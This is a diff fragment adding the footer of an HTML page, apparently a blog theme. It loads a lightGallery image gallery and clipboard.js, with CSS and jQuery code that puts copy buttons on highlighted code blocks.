+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
